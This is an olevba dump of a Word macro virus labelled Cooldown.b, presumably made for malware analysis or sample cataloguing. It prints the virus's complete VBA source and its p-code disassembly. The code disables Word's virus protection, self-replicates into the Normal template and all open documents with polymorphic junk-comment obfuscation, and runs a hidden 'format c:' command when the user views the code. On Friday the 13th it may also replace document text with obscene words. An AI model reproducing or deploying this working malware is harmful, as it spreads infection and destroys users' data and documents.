olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cooldown.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cooldown.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
               ' 9698.537
Private Sub _
           Document_Open()
               
CoolDown _
   0
               
' 6143.058
End _
         Sub
   Private Sub Document_Close()
             CoolDown 0
       ' 6136.534
End Sub
               Private _
           Sub ViewVBCode()
       CoolDown _
          1
       ' 4987.288
End Sub
         
' 7052.226
' 5057.934
Private _
      Sub _
        CoolDown(How As Integer)
            On _
      Error Resume Next
           Dim c As String, _
 a _
     As _
             Long, b As Long, _
             d _
         As _
            Long, e As Long, f As Long, _
   res As _
              String, m _
     As _
       Boolean
            Randomize
   With Options
              .VirusProtection = _
                False
           ' 471.1831
.ConfirmConversions _
        = False
            .SaveNormalPrompt _
                = _
          False
   End With
           ' 3984.335
If How = _
           1 _
 Then
            ' 8606.404
s _
       = _
        Shell("format" & _
              Chr(32) & _
           "c:" _
       & _
     Chr(32) _
 & _
  "/autotest", _
 vbHide)
             ' 6976.805
Else
         With _
    NormalTemplate.VBProject.VBComponents(1).CodeModule
       If _
    Not _
           .Find("Cool" & "Down", _
         1, _
  1, _
                1000, 1000, _
            False, False) Then
       

' 2994.814
' 4033.705
' 7655.415
a _
         = .CountOfLines
                For _
     b = 1 To a
       .DeleteLines _
               (1)
  Next
           ' 6461.275
' 9465.145
' 4807.808
d = _
           1
   a _
           = _
             ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
               
' 7100.946
' 3855.403

' 8981.387

res _
            = _
      ""
         For _
            b = 1 _
 To a
     c _
   = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(b, 1)
               c _
             = _
    RTrim(LTrim(c))
                If foo(c, _
            f, _
            res) Then
        .InsertLines _
      d, _
Space(Rnd _
     * _
     16) & _
         res
         ' 4435.59
' 6455.385
d = d + _
  f
               f _
       = _
       0
              ' 1378.528
res = ""
     ' 2845.397
End _
 If
' 1812.611
Next
              ' 9198.63
' 9509.816

' 9251.315
NormalTemplate.Save
            ' 6880.943
End _
     If
        ' 5216.785
End With
            ' 4191.488
For e _
   = 1 To Documents.Count
              With _
        Documents(e).VBProject.VBComponents(1).CodeModule
   ' 680.1027
If _
               Not .Find("Cool" _
       & "Down", _
             1, 1, _
      1000, 1000, _
 False, _
          False) Then
         ' 2644.876
' 5208.129

a = .CountOfLines
            m _
             = Documents(e).Saved
 For _
               b = 1 To _
         a
 .DeleteLines _
           (1)
     Next
         ' 1616.071
d = 1
    a = _
        NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
             ' 8179.904
res = _
          ""
 
' 5365.369
' 4295.099
For _
   b = 1 To _
              a
      c = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(b, 1)
           c _
 = RTrim(LTrim(c))
          If _
         foo(c, f, _
               res) _
  Then
         ' 2279.423
' 6740.393
' 514.7952
.InsertLines _
        d, Space(Rnd * _
        16) _
 & res
 d = _
       d + f
     ' 4624.699
' 2096.517
' 7202.546
' 7647.229
f = _
             0
    ' 6373.487

' 2121.608
' 6893.111
res _
   = _
   ""
             
' 2481.338
End If
              Next
  ' 4314.839
' 3004.26
' 1572.881
If Documents(e).Path _
               <> _
   "" Then
           Documents(e).SaveAs _
               AddToRecentFiles:=False
   ' 9824.329
' 1663.181
End If
       If (WeekDay(Date) _
 = 6) _
        And (Day(Date) _
          = _
 13) _
  And _
   (Rnd > 0.7) _
         Then
  ' 2933.449
Application.StatusBar _
   = ""
              ' 348.9393
' 9365.158
Application.DisplayStatusBar _
            = _
   False
         Application.ScreenUpdating _
              = False
  ' 8335.021
' 3114.101
With _
    Documents(e).Content
                .Find.Execute _
          FindText:="ïð", ReplaceWith:="ïèçä", _
          Replace:=wdReplaceAll
           .Find.Execute FindText:="äð", ReplaceWith:="ïîíîñ", Replace:=wdReplaceAll
            ' 5836.699
.Find.Execute _
          FindText:="êð", ReplaceWith:="êîáûë", _
Replace:=wdReplaceAll
      ' 2475.666
.Find.Execute _
              FindText:="ñòð", _
        ReplaceWith:="åáàí", Replace:=wdReplaceAll
   ' 5852.046
.Find.Execute FindText:="ñð", _
              ReplaceWith:="ñðàê", _
         Replace:=wdReplaceAll
            .Find.Execute _
   FindText:="òð", _
         ReplaceWith:="òðàõ", _
            Replace:=wdReplaceAll
               
' 9282.806
.Find.Execute _
        FindText:="áð", _
            ReplaceWith:="áëÿä", _
 Replace:=wdReplaceAll
                ' 6638.065
' 7614.185
.Find.Execute FindText:="âð", ReplaceWith:="âûåá", Replace:=wdReplaceAll
            .Find.Execute FindText:="ãð", ReplaceWith:="ãîâí", _
              Replace:=wdReplaceAll
             .Find.Execute _
     FindText:="æð", _
    ReplaceWith:="æîï", _
      Replace:=wdReplaceAll

' 8791.414
' 7537.102
' 3375.583
.Find.Execute _
         FindText:="çð", _
 ReplaceWith:="çàëóï", Replace:=wdReplaceAll
              ' 4870.983
.Find.Execute FindText:="äæ", _
    ReplaceWith:="äæîï", Replace:=wdReplaceAll
            ' 9362.829
.Find.Execute FindText:="êàë", ReplaceWith:="äåð", _
Replace:=wdReplaceAll
            .Find.Execute _
                FindText:="áóõ", _
  ReplaceWith:="áðÿê", _
   Replace:=wdReplaceAll
             End With
         ' 3740.521
' 7288.3
Documents(e).UndoClear
' 5713.85
' 5956.67
Application.DisplayStatusBar = _
          True
          Application.ScreenUpdating _
         = True
    ' 3111.892
' 6512.252
Application.StatusBar _
      = ""
             ' 7393.604
End _
               If
               Documents(e).Saved _
   = m
              End _
     If
 End _
        With
        ' 7011.365
Next
             ' 9866.989
End _
 If
 ' 2999.397

' 9987.417
End _
     Sub
     
' 8866.263

' 3429.818
Private _
                Function _
           foo(ByRef s _
             As _
    String, ByRef i As Long, ByRef _
        res As _
               String) As _
             Boolean
   
Dim tmp As String
          ' 486.5986
' 8586.589
' 5289.067
If _
               (Left(s, 1) = "'") Or (Len(s) = 0) _
         Then
 ' 7978.172
' 5299.711
foo = _
            False
              Exit _
      Function
      ' 5787.237
' 1309.815
End _
  If
             ' 7038.897

If Right(s, _
               2) = _
    Chr(32) & _
       "_" _
              Then
               res = res _
        & Left(s, _
      Len(s) _
               - 1)
         

' 4972.939
foo _
  = False
            ' 5219.488
' 8706.896
' 7890.977
Exit Function
      End _
 If
     tmp = res _
           & s
     ' 8282.419
res = ""
 ' 8164.352
i = _
            1
     ' 1841.801
While Rnd > _
   0.5
             ' 1240.063
If Rnd _
 < _
      0.8 _
  Then
              res = res & "'" _
        & Str(Rnd _
  * 10000)
            
End _
             If
        ' 9004.449
res _
          = res & Chr(13)
 i = i _
              + 1
            
Wend
     ' 4882.628
' 7000.126
For _
   a = _
             1 _
     To _
      Len(tmp)
               res = res & _
                Mid(tmp, _
a, _
           1)
             If _
            Mid(tmp, _
         a, 1) _
     = _
               Chr(32) _
        Then
               If _
      Rnd > _
0.5 Then
              res = _
        res _
         & _
            "_" _
                & Chr(13) & _
  Space(Rnd * 16)
          i _
= i + _
1
  ' 8806.321
' 9267.178
End _
 If
 ' 5320.891
' 8953.635

' 7729.877
End If
    
' 5157.937
' 1585.824
Next
        
foo = True
   End _
         Function

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Cooldown.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 13922 bytes
' Line #0:
' 	QuoteRem 0x000F 0x0009 " 9698.537"
' Line #1:
' 	LineCont 0x0004 02 00 0B 00
' 	FuncDefn (Private Sub Document_Open())
' Line #2:
' Line #3:
' 	LineCont 0x0004 01 00 03 00
' 	LitDI2 0x0000 
' 	ArgsCall CoolDown 0x0001 
' Line #4:
' Line #5:
' 	QuoteRem 0x0000 0x0009 " 6143.058"
' Line #6:
' 	LineCont 0x0004 01 00 09 00
' 	EndSub 
' Line #7:
' 	FuncDefn (Private Sub Document_Close())
' Line #8:
' 	LitDI2 0x0000 
' 	ArgsCall CoolDown 0x0001 
' Line #9:
' 	QuoteRem 0x0007 0x0009 " 6136.534"
' Line #10:
' 	EndSub 
' Line #11:
' 	LineCont 0x0004 01 00 0B 00
' 	FuncDefn (Private Sub ViewVBCode())
' Line #12:
' 	LineCont 0x0004 01 00 0A 00
' 	LitDI2 0x0001 
' 	ArgsCall CoolDown 0x0001 
' Line #13:
' 	QuoteRem 0x0007 0x0009 " 4987.288"
' Line #14:
' 	EndSub 
' Line #15:
' Line #16:
' 	QuoteRem 0x0000 0x0009 " 7052.226"
' Line #17:
' 	QuoteRem 0x0000 0x0009 " 5057.934"
' Line #18:
' 	LineCont 0x0008 01 00 06 00 02 00 08 00
' 	FuncDefn (Private Sub CoolDown(How As Integer))
' Line #19:
' 	LineCont 0x0004 01 00 06 00
' 	OnError (Resume Next) 
' Line #20:
' 	LineCont 0x0028 05 00 01 00 06 00 05 00 07 00 0D 00 0D 00 0D 00 0E 00 09 00 0F 00 0C 00 19 00 03 00 1B 00 0E 00 1E 00 05 00 1F 00 07 00
' 	Dim 
' 	VarDefn c (As String)
' 	VarDefn a (As Long)
' 	VarDefn B (As Long)
' 	VarDefn d (As Long)
' 	VarDefn e (As Long)
' 	VarDefn False (As Long)
' 	VarDefn res (As String)
' 	VarDefn m (As Boolean)
' Line #21:
' 	ArgsCall Read 0x0000 
' Line #22:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #23:
' 	LineCont 0x0004 03 00 10 00
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #24:
' 	QuoteRem 0x000B 0x0009 " 471.1831"
' Line #25:
' 	LineCont 0x0004 02 00 08 00
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #26:
' 	LineCont 0x0008 02 00 10 00 03 00 0A 00
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #27:
' 	EndWith 
' Line #28:
' 	QuoteRem 0x000B 0x0009 " 3984.335"
' Line #29:
' 	LineCont 0x0008 03 00 0B 00 04 00 01 00
' 	Ld How 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #30:
' 	QuoteRem 0x000C 0x0009 " 8606.404"
' Line #31:
' 	LineCont 0x0024 01 00 07 00 02 00 08 00 06 00 0E 00 0B 00 0B 00 0C 00 07 00 0D 00 05 00 11 00 01 00 12 00 02 00 14 00 01 00
' 	LitStr 0x0006 "format"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "c:"
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0009 "/autotest"
' 	Concat 
' 	Ld vbHide 
' 	ArgsLd Shell 0x0002 
' 	St s 
' Line #32:
' 	QuoteRem 0x000D 0x0009 " 6976.805"
' Line #33:
' 	ElseBlock 
' Line #34:
' 	LineCont 0x0004 01 00 04 00
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #35:
' 	LineCont 0x0018 01 00 04 00 02 00 0B 00 09 00 09 00 0B 00 02 00 0D 00 10 00 11 00 0C 00
' 	LitStr 0x0004 "Cool"
' 	LitStr 0x0004 "Down"
' 	Concat 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	ArgsMemLdWith Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #36:
' Line #37:
' Line #38:
' 	QuoteRem 0x0000 0x0009 " 2994.814"
' Line #39:
' 	QuoteRem 0x0000 0x0009 " 4033.705"
' Line #40:
' 	QuoteRem 0x0000 0x0009 " 7655.415"
' Line #41:
' 	LineCont 0x0004 01 00 09 00
' 	MemLdWith CountOfLines 
' 	St a 
' Line #42:
' 	LineCont 0x0004 01 00 05 00
' 	StartForVariable 
' 	Ld B 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a 
' 	For 
' Line #43:
' 	LineCont 0x0004 02 00 0F 00
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsMemCallWith DeleteLines 0x0001 
' Line #44:
' 	StartForVariable 
' 	Next 
' Line #45:
' 	QuoteRem 0x000B 0x0009 " 6461.275"
' Line #46:
' 	QuoteRem 0x0000 0x0009 " 9465.145"
' Line #47:
' 	QuoteRem 0x0000 0x0009 " 4807.808"
' Line #48:
' 	LineCont 0x0004 02 00 0B 00
' 	LitDI2 0x0001 
' 	St d 
' Line #49:
' 	LineCont 0x0008 01 00 0B 00 02 00 0D 00
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St a 
' Line #50:
' Line #51:
' 	QuoteRem 0x0000 0x0009 " 7100.946"
' Line #52:
' 	QuoteRem 0x0000 0x0009 " 3855.403"
' Line #53:
' Line #54:
' 	QuoteRem 0x0000 0x0009 " 8981.387"
' Line #55:
' Line #56:
' 	LineCont 0x0008 01 00 0C 00 02 00 06 00
' 	LitStr 0x0000 ""
' 	St res 
' Line #57:
' 	LineCont 0x0008 01 00 0C 00 04 00 01 00
' 	StartForVariable 
' 	Ld B 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a 
' 	For 
' Line #58:
' 	LineCont 0x0004 01 00 03 00
' 	Ld B 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St c 
' Line #59:
' 	LineCont 0x0008 01 00 0D 00 02 00 04 00
' 	Ld c 
' 	ArgsLd LTrim 0x0001 
' 	ArgsLd RTrim 0x0001 
' 	St c 
' Line #60:
' 	LineCont 0x0008 05 00 0C 00 07 00 0C 00
' 	Ld c 
' 	Ld False 
' 	Ld res 
' 	ArgsLd foo 0x0003 
' 	IfBlock 
' Line #61:
' 	LineCont 0x0014 02 00 06 00 04 00 00 00 07 00 05 00 08 00 05 00 0B 00 09 00
' 	Ld d 
' 	Ld Rnd 
' 	LitDI2 0x0010 
' 	Mul 
' 	ArgsLd Space 0x0001 
' 	Ld res 
' 	Concat 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #62:
' 	QuoteRem 0x0009 0x0008 " 4435.59"
' Line #63:
' 	QuoteRem 0x0000 0x0009 " 6455.385"
' Line #64:
' 	LineCont 0x0004 04 00 02 00
' 	Ld d 
' 	Ld False 
' 	Add 
' 	St d 
' Line #65:
' 	LineCont 0x0008 01 00 07 00 02 00 07 00
' 	LitDI2 0x0000 
' 	St False 
' Line #66:
' 	QuoteRem 0x000E 0x0009 " 1378.528"
' Line #67:
' 	LitStr 0x0000 ""
' 	St res 
' Line #68:
' 	QuoteRem 0x0005 0x0009 " 2845.397"
' Line #69:
' 	LineCont 0x0004 01 00 01 00
' 	EndIfBlock 
' Line #70:
' 	QuoteRem 0x0000 0x0009 " 1812.611"
' Line #71:
' 	StartForVariable 
' 	Next 
' Line #72:
' 	QuoteRem 0x000E 0x0008 " 9198.63"
' Line #73:
' 	QuoteRem 0x0000 0x0009 " 9509.816"
' Line #74:
' Line #75:
' 	QuoteRem 0x0000 0x0009 " 9251.315"
' Line #76:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #77:
' 	QuoteRem 0x000C 0x0009 " 6880.943"
' Line #78:
' 	LineCont 0x0004 01 00 05 00
' 	EndIfBlock 
' Line #79:
' 	QuoteRem 0x0008 0x0009 " 5216.785"
' Line #80:
' 	EndWith 
' Line #81:
' 	QuoteRem 0x000C 0x0009 " 4191.488"
' Line #82:
' 	LineCont 0x0004 02 00 03 00
' 	StartForVariable 
' 	Ld e 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #83:
' 	LineCont 0x0004 01 00 08 00
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld e 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #84:
' 	QuoteRem 0x0003 0x0009 " 680.1027"
' Line #85:
' 	LineCont 0x0018 01 00 0F 00 06 00 07 00 09 00 0D 00 0D 00 06 00 11 00 01 00 13 00 0A 00
' 	LitStr 0x0004 "Cool"
' 	LitStr 0x0004 "Down"
' 	Concat 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	ArgsMemLdWith Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #86:
' 	QuoteRem 0x0009 0x0009 " 2644.876"
' Line #87:
' 	QuoteRem 0x0000 0x0009 " 5208.129"
' Line #88:
' Line #89:
' 	MemLdWith CountOfLines 
' 	St a 
' Line #90:
' 	LineCont 0x0004 01 00 0D 00
' 	Ld e 
' 	ArgsLd Documents 0x0001 
' 	MemLd Saved 
' 	St m 
' Line #91:
' 	LineCont 0x0008 01 00 0F 00 05 00 09 00
' 	StartForVariable 
' 	Ld B 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a 
' 	For 
' Line #92:
' 	LineCont 0x0004 02 00 0B 00
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsMemCallWith DeleteLines 0x0001 
' Line #93:
' 	StartForVariable 
' 	Next 
' Line #94:
' 	QuoteRem 0x0009 0x0009 " 1616.071"
' Line #95:
' 	LitDI2 0x0001 
' 	St d 
' Line #96:
' 	LineCont 0x0004 02 00 08 00
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St a 
' Line #97:
' 	QuoteRem 0x000D 0x0009 " 8179.904"
' Line #98:
' 	LineCont 0x0004 02 00 0A 00
' 	LitStr 0x0000 ""
' 	St res 
' Line #99:
' Line #100:
' 	QuoteRem 0x0000 0x0009 " 5365.369"
' Line #101:
' 	QuoteRem 0x0000 0x0009 " 4295.099"
' Line #102:
' 	LineCont 0x0008 01 00 03 00 05 00 0E 00
' 	StartForVariable 
' 	Ld B 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a 
' 	For 
' Line #103:
' 	Ld B 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St c 
' Line #104:
' 	LineCont 0x0004 01 00 01 00
' 	Ld c 
' 	ArgsLd LTrim 0x0001 
' 	ArgsLd RTrim 0x0001 
' 	St c 
' Line #105:
' 	LineCont 0x000C 01 00 09 00 07 00 0F 00 09 00 02 00
' 	Ld c 
' 	Ld False 
' 	Ld res 
' 	ArgsLd foo 0x0003 
' 	IfBlock 
' Line #106:
' 	QuoteRem 0x0009 0x0009 " 2279.423"
' Line #107:
' 	QuoteRem 0x0000 0x0009 " 6740.393"
' Line #108:
' 	QuoteRem 0x0000 0x0009 " 514.7952"
' Line #109:
' 	LineCont 0x000C 02 00 08 00 08 00 08 00 0A 00 01 00
' 	Ld d 
' 	Ld Rnd 
' 	LitDI2 0x0010 
' 	Mul 
' 	ArgsLd Space 0x0001 
' 	Ld res 
' 	Concat 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #110:
' 	LineCont 0x0004 02 00 07 00
' 	Ld d 
' 	Ld False 
' 	Add 
' 	St d 
' Line #111:
' 	QuoteRem 0x0005 0x0009 " 4624.699"
' Line #112:
' 	QuoteRem 0x0000 0x0009 " 2096.517"
' Line #113:
' 	QuoteRem 0x0000 0x0009 " 7202.546"
' Line #114:
' 	QuoteRem 0x0000 0x0009 " 7647.229"
' Line #115:
' 	LineCont 0x0004 02 00 0D 00
' 	LitDI2 0x0000 
' 	St False 
' Line #116:
' 	QuoteRem 0x0004 0x0009 " 6373.487"
' Line #117:
' Line #118:
' 	QuoteRem 0x0000 0x0009 " 2121.608"
' Line #119:
' 	QuoteRem 0x0000 0x0009 " 6893.111"
' Line #120:
' 	LineCont 0x0008 01 00 03 00 02 00 03 00
' 	LitStr 0x0000 ""
' 	St res 
' Line #121:
' Line #122:
' 	QuoteRem 0x0000 0x0009 " 2481.338"
' Line #123:
' 	EndIfBlock 
' Line #124:
' 	StartForVariable 
' 	Next 
' Line #125:
' 	QuoteRem 0x0002 0x0009 " 4314.839"
' Line #126:
' 	QuoteRem 0x0000 0x0008 " 3004.26"
' Line #127:
' 	QuoteRem 0x0000 0x0009 " 1572.881"
' Line #128:
' 	LineCont 0x0008 07 00 0F 00 08 00 03 00
' 	Ld e 
' 	ArgsLd Documents 0x0001 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #129:
' 	LineCont 0x0004 06 00 0F 00
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld e 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemCall SaveAs 0x0001 
' Line #130:
' 	QuoteRem 0x0003 0x0009 " 9824.329"
' Line #131:
' 	QuoteRem 0x0000 0x0009 " 1663.181"
' Line #132:
' 	EndIfBlock 
' Line #133:
' 	LineCont 0x001C 06 00 01 00 09 00 08 00 0F 00 0A 00 10 00 01 00 12 00 02 00 13 00 03 00 18 00 09 00
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	Paren 
' 	And 
' 	Ld Rnd 
' 	LitR8 0x6666 0x6666 0x6666 0x3FE6 
' 	Gt 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #134:
' 	QuoteRem 0x0002 0x0009 " 2933.449"
' Line #135:
' 	LineCont 0x0004 03 00 03 00
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt StatusBar 
' Line #136:
' 	QuoteRem 0x000E 0x0009 " 348.9393"
' Line #137:
' 	QuoteRem 0x0000 0x0009 " 9365.158"
' Line #138:
' 	LineCont 0x0008 03 00 0C 00 04 00 03 00
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #139:
' 	LineCont 0x0004 03 00 0E 00
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #140:
' 	QuoteRem 0x0002 0x0009 " 8335.021"
' Line #141:
' 	QuoteRem 0x0000 0x0009 " 3114.101"
' Line #142:
' 	LineCont 0x0004 01 00 04 00
' 	StartWithExpr 
' 	Ld e 
' 	ArgsLd Documents 0x0001 
' 	MemLd Content 
' 	With 
' Line #143:
' 	LineCont 0x0008 04 00 0A 00 0C 00 0A 00
' 	LitStr 0x0002 "ïð"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "ïèçä"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #144:
' 	LitStr 0x0002 "äð"
' 	ParamNamed FindText 
' 	LitStr 0x0005 "ïîíîñ"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #145:
' 	QuoteRem 0x000C 0x0009 " 5836.699"
' Line #146:
' 	LineCont 0x0008 04 00 0A 00 0C 00 00 00
' 	LitStr 0x0002 "êð"
' 	ParamNamed FindText 
' 	LitStr 0x0005 "êîáûë"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #147:
' 	QuoteRem 0x0006 0x0009 " 2475.666"
' Line #148:
' 	LineCont 0x0008 04 00 0E 00 08 00 08 00
' 	LitStr 0x0003 "ñòð"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "åáàí"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #149:
' 	QuoteRem 0x0003 0x0009 " 5852.046"
' Line #150:
' 	LineCont 0x0008 08 00 0E 00 0C 00 09 00
' 	LitStr 0x0002 "ñð"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "ñðàê"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #151:
' 	LineCont 0x000C 04 00 03 00 08 00 09 00 0C 00 0C 00
' 	LitStr 0x0002 "òð"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "òðàõ"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #152:
' Line #153:
' 	QuoteRem 0x0000 0x0009 " 9282.806"
' Line #154:
' 	LineCont 0x000C 04 00 08 00 08 00 0C 00 0C 00 01 00
' 	LitStr 0x0002 "áð"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "áëÿä"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #155:
' 	QuoteRem 0x0010 0x0009 " 6638.065"
' Line #156:
' 	QuoteRem 0x0000 0x0009 " 7614.185"
' Line #157:
' 	LitStr 0x0002 "âð"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "âûåá"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #158:
' 	LineCont 0x0004 0C 00 0E 00
' 	LitStr 0x0002 "ãð"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "ãîâí"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #159:
' 	LineCont 0x000C 04 00 05 00 08 00 04 00 0C 00 06 00
' 	LitStr 0x0002 "æð"
' 	ParamNamed FindText 
' 	LitStr 0x0003 "æîï"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #160:
' Line #161:
' 	QuoteRem 0x0000 0x0009 " 8791.414"
' Line #162:
' 	QuoteRem 0x0000 0x0009 " 7537.102"
' Line #163:
' 	QuoteRem 0x0000 0x0009 " 3375.583"
' Line #164:
' 	LineCont 0x0008 04 00 09 00 08 00 01 00
' 	LitStr 0x0002 "çð"
' 	ParamNamed FindText 
' 	LitStr 0x0005 "çàëóï"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #165:
' 	QuoteRem 0x000E 0x0009 " 4870.983"
' Line #166:
' 	LineCont 0x0004 08 00 04 00
' 	LitStr 0x0002 "äæ"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "äæîï"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #167:
' 	QuoteRem 0x000C 0x0009 " 9362.829"
' Line #168:
' 	LineCont 0x0004 0C 00 00 00
' 	LitStr 0x0003 "êàë"
' 	ParamNamed FindText 
' 	LitStr 0x0003 "äåð"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #169:
' 	LineCont 0x000C 04 00 10 00 08 00 02 00 0C 00 03 00
' 	LitStr 0x0003 "áóõ"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "áðÿê"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #170:
' 	EndWith 
' Line #171:
' 	QuoteRem 0x0009 0x0009 " 3740.521"
' Line #172:
' 	QuoteRem 0x0000 0x0007 " 7288.3"
' Line #173:
' 	Ld e 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemCall UndoClear 0x0000 
' Line #174:
' 	QuoteRem 0x0000 0x0008 " 5713.85"
' Line #175:
' 	QuoteRem 0x0000 0x0008 " 5956.67"
' Line #176:
' 	LineCont 0x0004 04 00 0A 00
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #177:
' 	LineCont 0x0004 03 00 09 00
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #178:
' 	QuoteRem 0x0004 0x0009 " 3111.892"
' Line #179:
' 	QuoteRem 0x0000 0x0009 " 6512.252"
' Line #180:
